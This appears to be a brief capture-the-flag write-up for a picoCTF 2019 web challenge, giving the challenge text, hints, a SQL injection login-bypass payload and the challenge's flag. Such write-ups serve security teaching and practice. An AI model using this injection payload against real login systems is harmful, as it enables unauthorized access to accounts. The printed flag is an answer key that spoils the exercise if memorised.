## Irish-Name-Repo 1 (300)

#### Description
> There is a website running at https://2019shell1.picoctf.com/problem/12273/ (link) or http://2019shell1.picoctf.com:12273. Do you think you can log us in? Try to see if you can login!

#### Hint
> There doesn't seem to be many ways to interact with this, I wonder if the users are kept in a database?

> Try to think about how does the website verify your login?

#### Solution
Visit https://2019shell1.picoctf.com/problem/12273/login.html.
Login with this SQL injection:
```
Username: ' or 1=1 -- -
Password: anything
```

#### Flag
`picoCTF{s0m3_SQL_34865514}`